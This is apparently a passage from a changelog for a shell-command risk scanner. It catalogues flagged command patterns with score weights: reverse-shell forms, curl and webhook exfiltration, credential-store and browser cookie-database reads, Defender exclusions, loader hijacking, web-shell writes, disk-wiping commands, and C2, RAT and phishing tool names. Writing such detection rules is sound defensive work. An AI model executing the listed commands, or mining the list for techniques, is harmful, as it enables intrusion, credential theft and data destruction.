  mobile: `adb shell|install|push|root|reboot|sideload|remount|
  disable-verity|unroot`, `fastboot flash|oem|erase|reboot|unlock|
  format|set_active`, `heimdall flash`, `mtkclient`, `edl`,
  `scrcpy`/`sndcpy`, `idevice*` family, `ios-deploy`/`ifuse`/`iproxy`,
  `checkra1n`/`palera1n`/`magisk`, `frida*`/`objection`/`apktool`/
  `jadx`/`apksigner sign`/`d2j-dex2jar`/`baksmali`/`quark-engine`/
  `drozer`/`mobsf`; RE/debug: `radare2`/`rabin2`/`rasm2`/`radiff2`/
  `rizin`/`idat64`/`ghidra`/`analyzeHeadless`/`retdec`/`x64dbg`/
  `pwndbg`/`gef`/`peda`/`binlex` + flag-gated `cutter`/`hopper`/`edb`/
  `windbg`/`capa`/`floss`/`yara`; OSINT/secret-scan: `theharvester`/
  `recon-ng`/`spiderfoot`/`holehe`/`ghunt`/`phoneinfoga`/`metagoofil`/
  `dnstwist`/`trufflehog`/`gitleaks`/`shhgit`/`gitrob`/
  `detect-secrets` + gated `sherlock`/`shodan`/`censys`; SCADA/
  telephony/queue: `mbpoll`/`modpoll`/`snap7`/`pymodbus`,
  `asterisk -r`, `fs_cli`, `kamcmd`/`kamctl`, `opensips-cli`, `mmcli`/
  `qmicli`/`mbimcli`, `mosquitto_pub/sub`, `emqx` ctl verbs,
  `rabbitmqctl`/`rabbitmqadmin`, `kafka-*` producer/consumer/topics/
  acls/delete-records, `pulsar-admin`/`pulsar-client`, `nats-*`,
  `zkcli`, `flush_all`; DB destructive: `sqlcmd`/`cqlsh`/`beeline`/
  `clickhouse-client`/`impala-shell`/`presto`/`trino`/`db2`/`snowsql`/
  `influx`/`bq`/`arangosh`/`cypher-shell` + drop/truncate/delete;
  supply publish: `npm publish|unpublish|deprecate|access`, `yarn
  publish|unpublish` + `application -kill`, `twine upload`, `cargo
  publish|yank`, `gem push`, `conan upload|remove`, `nuget`/`dotnet
  nuget` push/delete, `oras push`, `jfrog rt`, `mvn deploy|release`,
  `gradle`/`poetry`/`pnpm publish`; CI/CD control: `gh` workflow/
  secret/variable/api/release/repo/auth/key/run verbs, `glab` ci/
  variable/release/auth/repo, `fly` set-pipeline/hijack/trigger,
  `flyctl` destroy/deploy/scale/secrets/ssh, `jenkins-cli`, `gitlab-
  runner register|unregister|exec`, `circleci`/`travis`/`drone`/
  `buildkite-agent` verbs; deploy/destroy: `sls`/`serverless`/`sam`
  deploy/remove/invoke, `railway`/`vercel`/`netlify` rm/delete/env/
  deploy, `heroku` apps:destroy/addons:destroy/config:set/pg:kill/
  pg:reset/ps:scale/maintenance/drains/certs, `vagrant destroy|
  package`; supervisors: `pm2` all verbs, `supervisorctl` stop/
  shutdown/update/signal/remove/add, `monit`, `god`, `bluepill`,
  `svcadm`; `journalctl --rotate|--flush|--sync|--relinquish|--
  header`, sysrq-trigger write; hardware/firmware: `flashrom -w|-e|
  --erase|-p`, `dfu-util` write, `avrdude -u|-e|-c`, `esptool`
  write/erase/read/verify/dump/merge/run, `usbreset /dev`,
  `usb_modeswitch`, `openocd -f|-c`, `gpioset`/`i2cset`/`spidev`,
  `nandwrite`/`nandtest`/`nanddump`/`ubiformat`/`mtd_debug`; radio/
  BLE/NFC/GPS: `hackrf_*`, `rtl_sdr`/`rtl_fm`, `airprobe`/`kalibrate`,
  `ubertooth`, `btmon`/`btproxy`/`bleah`/`crackle`, `hcitool` scan/
  lescan/cc, `gatttool`, `bluetoothctl` pair/connect/discoverable/
  agent/power, `proxmark3`/`pm3`/`mfoc`/`mfcuk`/`nfc-list`, `killerbee`/
  `zb*` replay/flood/sniff, `gps-sdr-sim`/`gpsfaker`/`fakegps`/`gnss-
  sdr`; input snoop/GUI exec: `evtest`, `libinput debug|record`,
  `showkey`, `dumpkeys`, `wev`, `wshowkeys`, `xinput` test/set/
  float/disable, `hyprctl`/`swaymsg`/`i3-msg` exec; fake infra:
  `fakedns`/`fakenet`/`inetsim`/`apatedns`/`remnux`; phish extras:
  `hiddeneye`/`seeker`/`socialfish`/`nexphisher`/`camphish`/`sayhello`/
  `stormbreaker`/`pyphisher`/`madphish`/`mrphish`/`evilurl`; C2 extras:
  `evil-winrm`, `villain`/`mythic`/`covenant`/`havoc` (gated),
  `darkcomet`/`poisonivy`/`gh0st`/`backdoor-factory`/`bdfproxy`/
  `nimcrypt`/`nimplant`, `unicorn`+`.py`, `scarecrow`, `upx` packed;
  print/spool: `printui /ga|/gd|/ge|/dd`/`printuientry`, `verifier`
  driver-verify, `lpadmin` -x/-p/-v/-e, `cancel -a`, `lpmove`,
  `cupsdisable`/`cupsreject`; boot regen: `update-initramfs`,
  `mkinitrd`, `update-grub`, `grub*-mkconfig`, `grub-install`;
  `ssh-keygen -s` CA-sign; mail exfil: `mutt`/`mailx`/`sendmail`/
  `s-nail`/`mpack` send forms; webhook exfil: `curl|wget|httpie|xh`
  + data flag → `api.telegram.org`/`hooks.slack.com`/`discord webhooks`/
  `webhook.site`/`pipedream`/`requestbin`/`beeceptor`/`smee.io`;
  systemd/user: `systemd-cryptenroll --`, `homectl` create/remove/
  passwd/update, `bootctl` install/remove/set-default, `udevadm`
  trigger/test/control; crypto store: `clevis`, `fscrypt`, `tomb`,
  `gocryptfs`, `encfs`, `cryfs`, `veracrypt`, `ecryptfs`, `htpasswd`
  -c/-b/-B/-d; `amtool`/`mimirtool`/`grafana-cli` admin; hypervisor/
  cloud: `onevm`/`onehost`, `pvesh`, `qm`/`pct` destroy/stop/exec,
  `openstack`/`nova` delete, `doctl`/`hcloud`/`scw` delete, `oci`
  terminate, `govc`/`vim-cmd`/`esxcli` VM kill, `virtctl`, `rancher`/
  `rke`, `k3d`/`kind`/`minikube`/`colima` delete, `docker swarm`
  leave/join, `ctr exec`, `umoci`/`skopeo`/`cosign`, `helmfile`,
  `argocd` app delete/sync, `flux` delete/uninstall, `certbot`
  delete/revoke, `kubeseal`, `sops -d` decrypt; big-data:
  `spark-submit`, `flink` run/cancel, `oozie`, `airflow`, `sqoop`,
  `distcp`, `huggingface-cli` upload; pcap/replay: `driftnet`/
  `xplico`/`text2pcap`/`mergecap`/`editcap`/`trafgen`/`mausezahn`/
  `nemesis`/`parprouted`/`zarp`, `lftp`/`ncftpput`/`ncftpget`,
  `autorunsc`/`handle64`/`logonsessions`; browser remote-debug:
  `chromium`/`chrome`/`firefox`/`msedge`/`brave`/`electron`
  --remote-debugging-*.

- **Windows eventlog/defense/AD/boot/cert primitives + Unix
  net-config/audit/account/package ops + offensive-tool names +
  infra/cloud/container/cred-store/forensic primitives
  (cycle-242)**: PS cmdlets now flag — `eventcreate`,
  `Clear/Remove/Limit/New/Write/Get-EventLog`, `Get-WinEvent`,
  `New/Set/Disable/Remove-NetFirewallRule`,
  `Set-NetFirewallProfile -Enabled False`, `Disable-NetAdapter`,
  `Set-DnsClientServerAddress`, `New/Remove-NetIP|Route|Neighbor`,
  `Remove-Item -Recurse -Force`, `Add/Remove-Computer`,
  `Set-SmbServer|ClientConfiguration`, `New/Remove/Set-SmbShare`,
  `Invoke-DCSync/-Kerberoast/-ReflectivePEInjection/-DllInjection/
  -UserHunter/-BloodHound/-PowerView`, the `Get/Set/New/Remove-AD*`
  family, `New-PSDrive` UNC, `net computer /add`,
  `bash.exe -c`, `regedit /e`, `regini`, `odbcconf`, `hh`, `sdbinst`,
  `vbc|csc|jsc`, `caspol` policy ops, `InfDefaultInstall`,
  `settingcontent-ms`, `dfshim`, `xbap`, `winscp /command|/script`,
  `plink|pscp` flags, `net1`, `msra /offerra|/saveasfile`, `tsdiscon`,
  `bcdedit /delete|/create`, `bootsect`, `bootrec`, `bcdboot`,
  `certreq` submit/new/enroll, `certutil -exportPFX|-addstore|
  -delstore|-key|-backup`, `pvk2pfx`, `signtool sign`, `nbtstat -a|-c`,
  `ipconfig /displaydns|/flushdns`, sticky-keys form
  (copy/move/replace of `system32\{utilman,sethc,osk,narrator,magnify,
  atbroker}`), `netsh trace|http add urlacl|sslcert|dnsclient set`,
  `wusa /uninstall`, `dism /remove`, `fltmc unload`, `lodctr`,
  `psr`, `sysprep /generalize`, `netdom`. Unix ops: `history -c|-w|-d`,
  `HISTFILE=/dev/null`, `crontab -r`, `atrm`, package removal
  (`apt|yum|dnf|zypper|pacman|apk|dpkg` remove/purge), `vipw|vigr`,
  `pwunconv|grpunconv`, `newusers`, `deluser|delgroup`,
  `pam-auth-update`, `chcon`, `audit2allow` write ops, `load_policy`,
  `semodule_package|_link|_expand|_deps`, `setfiles`, `dhclient`
  script overrides (`-sf|-cf|-lf|-pf`), `postconf -e`, `postfix` stop/
  flush, `ipsec|strongswan` stop/down, `conntrack -D|-F`, `ip route|
  rule|tunnel` add/del/flush, `ip link add type` (bridge/veth/vxlan/
  macvlan/macsec/gre/vrf/vcan/geneve/erspan), `tc` mirred/ingress/
  redirect, `nft` masquerade/dnat/snat/tproxy/table/chain writes,
  `firewall-cmd --permanent|--direct|--panic`, `ufw disable|reset`,
  `fail2ban-client unban|stop`, `bridge fdb|vlan` writes, `ovs-vsctl`,
  `ovs-ofctl|ovs-dpctl` writes, `ethtool -s`, wifi attack tools
  (`hostapd|airbase-ng|aireplay-ng|aircrack-ng|reaver|bully|mdk3|
  mdk4|wifite|fluxion|eaphammer|kismet`), `responder`, `mitm6`,
  `ntlmrelayx`, the `impacket-*`/`*.py` offensive-tool name family,
  AD/Azure tool names (`krbrelayx|whisker|adidnsdump|dnstool|
  sharpdpapi|azurehound|roadrecon|stormspotter`). Offensive names:
  scanners (`nmap|masscan|zmap|rustscan|naabu|hping|arping|fping -g|
  unicornscan`), DNS/subdomain recon (`dnsrecon|fierce|dnsenum|
  dnsmap|massdns|subbrute|sublist3r|amass|subfinder|assetfinder|
  findomain|httprobe|httpx|waybackurls|katana|hakrawler|gospider`),
  dir/vuln brute (`gobuster|ffuf|dirb|dirsearch|feroxbuster|wfuzz|
  nuclei|nikto|wpscan|joomscan|droopescan|cmsmap|sqlmap|ghauri|
  commix|nosqlmap|xsstrike|dalfox|skipfish|w3af|arachni|wapiti|
  zaproxy|burpsuite|arjun|paramspider|kiterunner`), brute force
  (`hydra|medusa|ncrack|patator|crowbar|kerbrute|hashcat|john --
  |chntpw`), exploit search (`searchsploit|routersploit|getsploit`),
  fingerprint/VoIP/replay (`whatweb|p0f|amap|heartleech|swaks|
  sipvicious|svmap|svwar|svcrack|sngrep|tcpreplay|tcprewrite|
  bittwist|packeth`), packet craft/C2 (`scapy|ysoserial|msfvenom|
  msfconsole|meterpreter|shellter|veil|powercat|teamserver|
  cobaltstrike|brute-ratel|koadic|starkiller|apfell|trevorc2|gcat|
  poshc2|shad0w`), webshells (`godzilla|behinder|antsword|weevely|
  b374k|p0wny|alfashell|c99shell`), cred-dump (`lazagne|mimipenguin|
  linikatz|pypykatz|lsassy|gsecdump|pwdump|fgdump|cachedump|wce|
  nanodump|handlekatz|mirrordump|sqldumper|createdump|comsvcs
  minidump`), privesc (`linpeas|linenum|linux-exploit-suggester|
  unix-privesc-check|linuxprivchecker|pspy|winpeas|wesng|powerup|
  sharpup|beroot`), potato family, k8s/container attack
  (`kube-hunter|peirates|kubesploit|kdigger|deepce|amicontained`),
  tunnel/proxy (`chisel|ligolo|gost|frpc|frps|rathole|websocat|
  iodine|dnscat|dns2tcp|icmpsh|ptunnel|pingtunnel|udp2raw|kcptun|
  v2ray|xray run|trojan|ss-server|ss-local|hysteria|clash|stunnel|
  sslh|proxytunnel|httptunnel|torsocks|torify|eggdrop|psybnc|znc|
  ezbounce`), fleet exec (`pssh|pdsh|clush|mussh|parallel-ssh|
  sshpass|expect -c|ansible -m command|shell|raw|script|salt cmd.run|
  salt-call|salt-ssh|salt-key -a|chef exec|apply|puppet apply|bolt`),
  infra (`kubectl exec|cp|port-forward|debug|drain|cordon|delete`,
  `kubeadm reset|token`, `helm uninstall|delete|rollback`, `oc rsh|
  exec|debug`, `runc|runsc` run/exec, `crictl`, `buildah`, `podman`,
  `nerdctl`, `lxc|incus`, `virsh` writes, `vboxmanage`, `guestfish|
  guestmount|virt-*`, `qemu-nbd`, `nbdkit`, `targetcli|tgtadm`,
  `iscsiadm` login, `drbdadm`, `losetup`, `mknod /dev`, `debugfs`,
  `xfsdump|xfsrestore`, disk forensics (`extundelete|ext4magic|
  ntfsundelete|testdisk|photorec|bulk_extractor`), memory forensics
  (`volatility|volatility3|rekall|avml|linpmem|winpmem|osxpmem`),
  anti-forensic wipe (`srm|wipe|bleachbit|bcwipe|exiftool -all=`),
  `steghide|binwalk|httrack`, screen/cam capture (`fswebcam|
  uvccapture|streamer -c|v4l2-ctl --stream|gst-launch` device srcs|
  raspistill|raspivid|libcamera-still|libcamera-vid|imagesnap|
  videosnap|recordmydesktop`), clipboard (`xclip|xsel|wl-paste|
  wl-copy|pbcopy`), session spy (`conspy|sudoreplay|reptyr|perf
  trace|record|lttng|trace-cmd|dtrace|dtruss|fs_usage|spindump|
  sysdiagnose|opensnoop|execsnoop`), macOS ops (`log erase|collect`,
  `plutil -insert|-replace|-remove`, `mdutil -E|-i`, `tmutil` delete/
  disable/setdestination, `softwareupdate --ignore`, `installer -pkg`,
  `jamf recon|removeFramework|enroll`, `dseditgroup`, `asr restore`,
  `bless --setBoot`, `pmset` disablesleep/autorestart/destroyfvkey,
  `lsregister -f`, `install_name_tool`, `sandbox-exec`), BMC/TPM
  (`ipmitool` shell|sol|chassis|user|lan|sel|mc|raw, `ipmiutil|
  ipmicfg`, `racadm`, `hponcfg`, `ilorest`, `tpm2_clear|changeauth|
  evictcontrol|takeownership|dictionarylockout`), credential stores
  (`keepassxc-cli|kpcli|secret-tool|kwallet-query|lpass|gopass|
  bw export|unlock|list|keyring get|set|nmcli -s|ssh-import-id`),
  DB/service writes (`redis-cli` eval/flushall/config/shutdown/
  slaveof, `mongo|mongosh --eval`, `ldapsearch` cred forms,
  `ldapadd|ldapmodify|ldapdelete|ldappasswd`, `smbclient -c`,
  `rpcclient -c`, `showmount`, `rpcinfo`), cloud destructive/
  cred ops (`aws` delete/terminate/ssm/secretsmanager/sts assume-role/
  iam attach/presign/kms, `gcloud` compute ssh/secrets/sa-keys/
  deletes, `az keyvault|run-command`), `ceph`, `hdfs dfs` writes,
  `rclone` copy/serve, `sshfs`, `curlftpfs`, `nbd-client`; P9 gained
  `gpart` destroy/delete, `geli` kill/clear, `gbde`, `newfs` on
  device, `growfs -y` (+60).
- **Windows audit/ACL/AD/defense primitives + Unix mount/SELinux/
  audit/L2/session-record + DNS-control/infra-destruct/cloud-wipe
  (cycle-241)**: `wevtutil sl`, `logman` write ops, `pktmon`,
  `netsh advfirewall` rule add/delete, `cmdkey /generic`,
  `net group /add`, `sc failure|sdset`, `icacls /deny`, `cacls /g`,
  `subinacl` grants, `wbadmin stop job`, AD recon/write (dsquery,
  dsadd, dsmod, dsrm, csvde -f, ldifde -f, netdom, nltest, dsacls
  /g), `w32tm /config`, `route delete`, `reg save|export` gated on
  sam/security/system/ntds hives, `msiexec /x`, `schtasks /delete`,
  `rwinsta`/`tskill`/`tsshutdn`, `pnputil` driver add/delete;
  `mount --bind|--rbind|remount`, `setenforce permissive`,
  `semodule`/`setsebool`/`semanage` writes, `aa-disable`/`aa-teardown`,
  `auditctl -e 0|2|-D`, `ip xfrm`, `ebtables`, `brctl`, `iw`/
  `iwconfig` monitor, `airmon-ng`, `ltrace`, `strace -f|-e`,
  `script -q`, `ttyrec`, `asciinema rec`, `sysdig`, `falco`,
  `kldload`/`kldunload`, `ipfw`, `svc -d`, `rcctl`, `kexec -l|-e`,
  `grubby --args`, `grub-set-default`, `dracut --add|--install`,
  `realm`/`adcli` join, `authselect`/`authconfig` writes,
  `cryptsetup` key-removal/reencrypt/header-backup,
  `resolvectl dns|nta`; `rndc` control ops, `unbound-control`,
  `knotc`, `pdns_control`, `terraform|pulumi|tofu destroy`,
  `kubectl delete --all`, `vault` kv/secrets/policy/token,
  `consul kv|exec`, `etcdctl` writes, `nomad` exec/alloc/stop,
  `aws s3 rb|s3api delete`, `gsutil rm|rb`, `az storage` delete/
  remove, `aria2c`, `httpie`, `transmission-remote -a`, `nmcli`
  mod/down/delete — all → `PASTE_WINDOWS_LOLBIN` +45

- **macOS defense-off/exec/account + memory/core scrape +
  namespace/dbus exec + stream-upload exfil + serve-host/MITM +
  diskutil/tape/firmware wipe**: spctl --global-disable|--add,
  csrutil clear|authenticated-root, fdesetup disable|remove|
  authrestart, profiles install|remove|-I|-i, launchctl bootout|
  disable, dscl create|passwd|append|delete|change (space and -
  forms), sysadminctl -addUser|-deleteUser|-resetPasswordFor|
  -secureTokenO*|-disableSecureToken|-autologin, pwpolicy
  setaccount|setuser|setpass|-u, defaults write LoginHook|LogoutHook|
  autorun, hdiutil http, do shell script (AppleScript exec),
  security authorizationdb|set-keychain, kickstart -activate|
  -configure|-install|-restart (ARD remote-admin), screencapture,
  pbpaste (clipboard steal), sntp -s, scutil --nc (VPN control),
  cupsctl --remote, networksetup -setautologin|-setvnc, shortcuts
  run, automator -i +45. lldb -p, gcore, eu-stack, procstat,
  coredumpctl dump|gdb|debug, cat|head|xxd|strings|hexdump|tail|od
  of /dev/mem|/dev/kmem|/dev/port, /proc/*/mem|environ|maps|
  kcore reads (meminfo excluded) +45. unshare -r|-m|--map-root|
  --fork (userns/mount escape), machinectl shell|exec, busctl call,
  dbus-send --system, loginctl enable-linger +45. nc|ncat|netcat <
  (file stream-out), tar|dd|cat piped to nc|ssh|socat (archive/disk
  stream exfil), nsupdate -k|-y (signed DNS write), openssl s_server,
  cryptcat, php -S, python -m http.server, ruby -run, darkhttpd|
  miniserve|webfsd|thttpd|smbserver|updog|twistd|python -m smtpd
  (ad-hoc serve/cred-capture hosts), ifconfig|ip link promisc
  (sniff mode), ip neigh add|replace|del (ARP write) +45.
  P9 +60: diskutil eraseDisk|eraseVolume|zeroDisk|secureErase|
  partitionDisk|deleteContainer|deleteVolume|apfs delete|apfs erase,
  sg_erase, hdparm --write-sector|--fwdownload|--dco-*|
  --trim-sector-ranges, mt -f /dev/st* erase.

- **GUI/input injection + screen/mic capture + web-terminal/VNC +
  eBPF + exfil upload + AD-recon/C2/RAT/phishing names + SUID
  install + sqlite cred-db + LOLBin names**: xdotool|ydotool|wtype
  (input injection), xhost +, screen -x, import -window, scrot|
  flameshot|gnome-screenshot|spectacle|wf-recorder|xwd|maim+flag|
  obs --start (screen capture), ffmpeg -f x11grab|avfoundation|
  pulse|alsa|gdigrab|v4l2|dshow (device capture), parecord|arecord|
  parec|sox -d|-t (mic capture), logkeys|keyd monitor|evsieve
  (keylog) +45. ttyd|gotty|shellinabox|tmate|teleconsole|sish|
  wstunnel|regeorg|pivotnacci|wetty (web-terminal backdoor),
  x11vnc|vncserver|x0vncserver|tigervnc|wayvnc (VNC share),
  bpftool|bpftrace (eBPF rootkit loader) +45. curl @-file upload
  (-F|-d|--form|--data|-T|--upload-file), wget --post-file +45.
  AD-recon names certipy|adidnsdump|windapsearch|ldeep|pywerview|
  rusthound|adenum|ldapdomaindump|snaffler|pingcastle|sharploader|
  sharpshooter|pezor|gadgettojscript|phant0m|stracciatella|
  invisibilitycloak|eventlogmaster|persistence-finder|fakessh|
  mailsniper|cewler|poshc2|nighthawk|bruteratel|cobaltstrike +
  real-word C2/stealer names (bloodhound|sliver|havoc|mythic|
  covenant|empire|merlin|viper|donut|freeze|scarecrow|parallax|
  xenomorph|redline|raccoon|vidar|bumblebee) flag-gated +45.
  Malware/RAT/phishing names asyncrat|njrat|nanocore|remcos|
  xworm|venomrat|purecrypter|azorult|agenttesla|formbook|lokibot|
  guloader|smokeloader|icedid|qakbot|qbot|emotet|trickbot|dridex|
  ursnif|spyeye|danabot|flubot|sharkbot|ermac|spynote|spymax|
  ahmyth|droidjack|androrat|omnirat|quasarrat|beef-xss|setoolkit|
  gophish|evilginx|modlishka|zphisher|shellphish|blackeye|
  advphishing|king-phisher|wifiphisher|wifipumpkin|airgeddon|
  procdump +45. install -m 4|2|u+s|+s (SUID install), robocopy
  /b (backup-mode steal), runas /savecred, sqlite3 × cookies|
  logins|moz_logins|login data|web data|places.sqlite (browser
  cred-db read), msbuild UNC|http, esentutl /y, iexpress|
  extrac32|wextract|makecab|syncappvpublishingserver|verclsid|
  pcalua|pcwrun|masvc|oobe+flag|ieexec|ie4uinit|installutil|
  regasm|regsvcs|msxsl|ilasm +45.

- **Systemctl/service/runlevel control + account mgmt + firewall
  rule-add + sysctl security keys + kernel-module load + boot/store
  config + sniff/spoof tools**: systemctl × stop|disable|mask|kill|
  halt|poweroff|reboot|kexec|suspend|hibernate|emergency|rescue|
  isolate|restart +45. service × stop|start|restart|disable,
  loginctl × poweroff|reboot|suspend|hibernate|halt|kill|terminate,
  busybox power/halt/reboot, init|telinit 1|s|S, reboot|poweroff|
  halt -, shutdown -h|now +45. useradd|adduser|groupadd|newusers|
  gpasswd|userdel|groupdel|groupmod|vipw|vigr|pwconv|grpconv|
  pwunconv, usermod -p|-l|-u|-s, passwd -d|-u|-e, faillock --reset|
  pam_tally2 --reset|faillog -r|lastlog clear|chage -m|-e|-i 0|-1
  (lockout-reset/expiry-removal) +45. iptables|ip6tables ×
  -I|-A|-P|-D|-R|--append|--insert|--policy|--replace|--delete
  (rule-add open-port), nft add, ufw allow|default +45. sysctl
  -w|= × ~25 security keys (randomize_va_space|core_pattern|
  suid_dumpable|kptr_restrict|dmesg_restrict|yama|modules_disabled|
  kexec_load|unprivileged_bpf|unprivileged_userns|uselib|
  perf_event_paranoid|accept_redirects|accept_source_route|
  send_redirects|rp_filter|tcp_syncookies|icmp_echo_ignore|
  log_martians|mmap_min_addr|protected_*|kernel.sysrq) +45.
  modprobe (query flags excluded)|dkms install|add +45. ldconfig
  /path|-n (loader-cache poison), ssh-copy-id|ssh-add path|-d,
  apt-key add, rpm --import +45. mokutil --disable|--import,
  efibootmgr -c|-b|-d|-B, efivar -w, update-alternatives --install
  +45. tcpdump|tshark -w (pcap capture), dumpcap|ngrep|tcpflow|
  arpspoof|dnsspoof|macof|yersinia|slowloris|nping, ostinato+flag
  +45. iptables NAT pivot now excludes -L/--list listing.
- **Storage/volume/RAID destruction (P9 +60)**: nvme format|
  sanitize, sg_sanitize|sg_format|sg_write_buffer, hdparm
  --security-erase|--security-disable, storcli|perccli|megacli|
  arcconf|hpssacli|omconfig delete, mdadm --stop|--zero-superblock|
  --fail|--remove, pvremove|vgremove|lvremove|lvreduce, dmsetup
  remove, cryptsetup erase|luksFormat, zfs destroy|zpool destroy|
  labelclear, btrfs subvolume|device delete, sfdisk --delete|/dev,
  parted rm|mklabel, fdisk|gdisk|cgdisk /dev, camcontrol format|
  sanitize, vdo remove|delete|stop, stratis destroy +60.

- **PowerShell cmdlet family / audit wipe / destructive Windows /
  cred+key material**: Add-Type|Assembly]::Load|Assembly.Load|
  LoadWithPartialName|LoadFrom|LoadFile (in-memory .NET load)
  +45. New-Service -BinaryPathName, Register/New/Set-ScheduledTask,
  New-ItemProperty|Set-ItemProperty|New-Item × \Run|RunOnce|IFEO|
  Winlogon|ImageFile|shell (PS persistence) +45. Set-ExecutionPolicy
  Bypass|Unrestricted +45. Unblock-File, Zone.Identifier
  remove|del|clear (MOTW strip) +45. New-LocalUser|Add-
  LocalGroupMember|Enable-LocalUser|Set-LocalUser -Password|
  New-ADUser|Add-ADGroupMember|Set-ADAccountPassword +45.
  Enable-PSRemoting|Enable-WSManCredSSP|Install-Module|
  Install-Package|Install-Script +45; Add-WindowsCapability|
  Enable-WindowsOptionalFeature × telnet|smb1|snmp|tftp +45.
  auditpol /clear|/remove|/set|/backup (audit wipe) +45.
  shutdown /s|/r|/m|/p|-s|-r +45. format [cd e f]:|/q|/y,
  format.com, del /s|/f /s, rmdir /s, rd /s +45. attrib +h|+s|
  -h|-s (hide/system) +45. net config /hidden, netsh -r|-f +45.
  klist purge|get, sudoedit, sudo -e, net time /set +45.
  Get-Credential|ConvertFrom/To-SecureString|Export/Import-CliXml
  +45. gpg --export-secret*, openssl pkcs12 -export, ssh-keygen
  -y, keytool -exportcert|-genkey, makecert,
  New-SelfSignedCertificate, aws iam create-access-key, aws
  configure set access|secret +45.

- **Env-var injection / lateral movement / Defender exclusions /
  cred-store enum / explorer+runas / fsutil+diskpart**: env
  hijack family +45 — LD_PRELOAD|LD_LIBRARY_PATH|
  DYLD_INSERT_LIBRARIES|LD_AUDIT|LD_PROFILE|GCONV_PATH|
  GLIBC_TUNABLES (loader), NODE_OPTIONS|PYTHONPATH|PYTHONHOME|
  PYTHONSTARTUP|RUBYLIB|RUBYOPT|PERL5OPT|PERL5LIB|PERL5DB|
  JAVA_TOOL_OPTIONS|_JAVA_OPTIONS|JDK_JAVA_OPTIONS|PHPRC|
  PHP_INI_SCAN_DIR|GEM_HOME|GEM_PATH (interpreter), GIT_SSH|
  GIT_SSH_COMMAND|GIT_PROXY_COMMAND|GIT_EXTERNAL_DIFF|GIT_ASKPASS|
  SSH_ASKPASS|SVN_SSH|CVS_RSH (vcs exec), PROMPT_COMMAND|BASH_ENV|
  ZDOTDIR|INPUTRC (shell startup), http|https|all|ftp|rsync
  _proxy= (traffic redirect), PATH=/tmp|/dev/shm|/var/tmp|.|
  /usr/tmp (PATH poison). Lateral: schtasks /s, sc|sc.exe \,
  reg add \, at \ (remote host ops) +45; \\host\c$|d$|admin$|
  ipc$|print$ admin-share paths +45. Defender: Add-MpPreference|
  Set-MpPreference + -ExclusionPath|-ExclusionProcess|
  -ExclusionExtension|-DisableRealtimeMonitoring|-DisableIOAV|
  -DisableBehaviorMonitoring|-DisableScriptScanning|
  -DisableBlockAtFirstSeen|-DisableTamperProtection|
  -DisableArchive|-DisableEmailScanning|-DisableNetworkProtection
  +45. Cred enum: vaultcmd, keymgr, netsh wlan key|export +45.
  explorer http|shell:|\\ (URL/startup-folder/UNC open) +45.
  Start-Process -Verb runas, runas /netonly +45. fsutil
  setzerodata|setvaliddata|behavior set +45; diskpart clean|
  create|format|select disk +45.

- **Interpreter -e exec / npx-URL / git upload-pack / exec -a /
  setcap+setfacl / netns+setpriv / misc exec vectors**: node|
  python|python3|perl|ruby|php|lua|luajit|gawk|rscript|pwsh ×
  -e|-c|-r + exec verb (child_process|os.system|subprocess|
  os.popen|pty.spawn|system(|exec(|popen(|spawn|shell_exec|
  passthru(|getRuntime|os.execute|eval(|commands.getoutput|
  loadstring) → +45 (bare -e print stays LOG 30). npx|pnpm dlx|
  bunx|yarn dlx + http|git+ (remote package exec) → +45.
  git clone --upload-pack|-u → +45. exec -a argv0 masquerade →
  +45. setcap +ep|+ei → +45; setfacl -m × /etc/|/root → +45.
  blkdiscard /|-, swapoff -|/ → destructive-class (+60/+45).
  ip netns exec|netns exec, setpriv --reuid|--inh-caps|
  --bounding-set|--ruid|--euid → +45. bwrap --bind|--dev-bind|
  --ro-bind → +45. emacs -l|--eval|-batch → +45. sed e-flag
  (1e , 1e', 1e") → +45. rsync --rsh → +45. sysvinit enable:
  update-rc.d|chkconfig|rc-update + defaults|on|add|enable → +45.
  P12b decode→exec chain: base64 -d|-D|--decode, openssl enc|aes,
  gpg -d|--decrypt, xxd -r added to fetch side; `; ./` added to
  exec-chain side. P15 decode|sh: gpg -d|--decrypt added. nc
  revshell gate excludes 'sync' (rsync -e ssh benign FP fix).

- **Miner exec / terminal injection / agent kill / env exfil /
  WinRM / timestomp / device-arg dd+mkfs**: cryptominer names
  (xmrig, minerd, cpuminer, xmr-stak, ethminer, bzminer, lolminer,
  phoenixminer, nanominer, gminer, teamredminer, nbminer, cgminer,
  sgminer, bfgminer, claymore -o/.exe, trex miner) + stratum+/:
  and donate-level flag + pool domains (nicehash, nanopool,
  supportxmr, minergate, f2pool, antpool, viabtc, 2miners,
  flypool, herominers, unmineable, miningpool) +45; stratum:/
  stratum+tcp:/stratum+ssl:/stratum2: URI schemes +30. Terminal
  injection: tmux send-keys, send-keys, screen -X stuff +45.
  Unix agent kill: pkill|killall|kill -9 × osquery/filebeat/
  datadog-agent/fluentd/fluent-bit/splunk/newrelic/telegraf/
  wazuh/auditbeat/metricbeat/packetbeat/qualys/rapid7/
  insight-agent/sysmon/velociraptor/falcon/sentinel/elastic-agent
  +45. env exfil: env |/env|/printenv/env >/printenv > × nc|
  curl|wget|socat/curl -F|-d/wget --post +45. sudo/su: | sudo -S,
  | su -, su -c stdin-password pipes +45. docker.sock mount /
  docker --socket +45. credential.helper store|get|! +45. WinRM:
  Enter-PSSession|New-PSSession|Invoke-Command|Invoke-WmiMethod|
  Invoke-CimMethod × -ComputerName|-Computer|-cn, winrm
  quickconfig +45. timestomp: touch -r|-t|-d|--reference +45.
  batch (at-family) -f/|batch +45. P9 destructive: mkfs /, mkfs -,
  mke2fs /, dd of=/dev/{sd,nvme,hd,vd,mmc,xvd}, dd if=/dev/
  {mem,kmem,sd,nvme} (raw-device read) — replaces over-broad
  `mkfs `/`dd if=` needles that fired on any dd copy / mkfs prose.

- **Webshell writes + revshell residuals + persistence-write
  expansion** (`hlse_supply.c`): P14 — script tag/web extension
  (<?php|<%=|<%|.php|.asp|.jsp|.cgi|.war) + request superglobal
  ($_GET|$_POST|$_REQUEST|$_COOKIE|$_FILES|getParameter) + exec
  verb (system(|eval(|exec(|shell_exec(|passthru(|assert(|popen(|
  proc_open(|getRuntime) fires +50 as a dropped-web-shell write;
  <%eval|<%execute|<%CreateObject|<%WScript contiguous forms and
  getRuntime().exec + .jsp also fire. P9 revshell adds ` -c ` to
  the nc/ncat/netcat flag set (OpenBSD/busybox exec variant),
  telnet + sh-pipe (the double-telnet exfil shell), ruby
  TCPSocket + popen|exec|system(|dup2, perl -M + IO::Socket, and
  PowerShell New-Object + Sockets socket objects (+60 all).
